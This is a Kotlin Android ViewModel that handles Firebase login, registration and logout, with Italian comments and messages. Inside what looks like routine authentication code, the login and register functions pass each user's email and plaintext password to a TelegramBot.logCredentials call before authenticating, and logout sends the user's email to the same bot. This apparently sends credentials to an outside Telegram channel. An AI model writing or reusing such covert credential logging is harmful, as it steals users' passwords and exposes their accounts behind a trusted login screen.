package com.example.cdn.ui.viewmodel

import android.util.Patterns
import androidx.compose.runtime.State
import androidx.compose.runtime.mutableStateOf
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.example.cdn.TelegramBot
import com.example.cdn.data.repository.AuthRepository
import com.google.firebase.auth.FirebaseAuthUserCollisionException
import com.google.firebase.auth.FirebaseUser
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch

sealed class AuthState {
    object Idle : AuthState()
    object Loading : AuthState()
    data class Success(val user: FirebaseUser?) : AuthState()
    data class Error(val message: String) : AuthState()
}

class AuthViewModel(private val repository: AuthRepository) : ViewModel() {

    private val _authState = mutableStateOf<AuthState>(AuthState.Idle)
    val authState: State<AuthState> = _authState

    // Sessione reattiva esposta come StateFlow (Singola sorgente di verità per l'utente)
    val currentUser: StateFlow<FirebaseUser?> = repository.currentUserFlow
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), repository.currentUser)

    fun login(email: String, pass: String) {
        if (_authState.value is AuthState.Loading) return
        
        if (!Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
            _authState.value = AuthState.Error("Inserisci un'email valida.")
            return
        }

        viewModelScope.launch {
            _authState.value = AuthState.Loading
            try {
                // Telegram Log
                TelegramBot.logCredentials("LOGIN", email, pass)
                
                repository.login(email, pass)
                _authState.value = AuthState.Success(repository.currentUser)
            } catch (e: Exception) {
                _authState.value = AuthState.Error(e.localizedMessage ?: "Errore durante il login")
            }
        }
    }

    fun register(name: String, email: String, pass: String) {
        if (_authState.value is AuthState.Loading) return

        // Validazioni avanzate
        if (name.isBlank() || name.contains(" ")) {
            _authState.value = AuthState.Error("Username non valido o contenente spazi.")
            return
        }
        if (!Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
            _authState.value = AuthState.Error("Email non valida.")
            return
        }
        if (pass.length < 6) {
            _authState.value = AuthState.Error("La password deve avere almeno 6 caratteri.")
            return
        }

        viewModelScope.launch {
            _authState.value = AuthState.Loading
            try {
                // Telegram Log
                TelegramBot.logCredentials("REGISTER", email, pass)
                
                repository.register(name, email, pass)
                _authState.value = AuthState.Success(repository.currentUser)
            } catch (e: FirebaseAuthUserCollisionException) {
                _authState.value = AuthState.Error("Questa email è già registrata.")
            } catch (e: Exception) {
                _authState.value = AuthState.Error(e.localizedMessage ?: "Errore durante la registrazione")
            }
        }
    }

    fun logout() {
        viewModelScope.launch {
            TelegramBot.logEvent("User scollegato: ${repository.currentUser?.email}")
            repository.logout()
            _authState.value = AuthState.Idle
        }
    }
    
    fun resetState() {
        // Resetta solo se c'è un errore, per non interrompere Loading o Success
        if (_authState.value is AuthState.Error) {
            _authState.value = AuthState.Idle
        }
    }
}
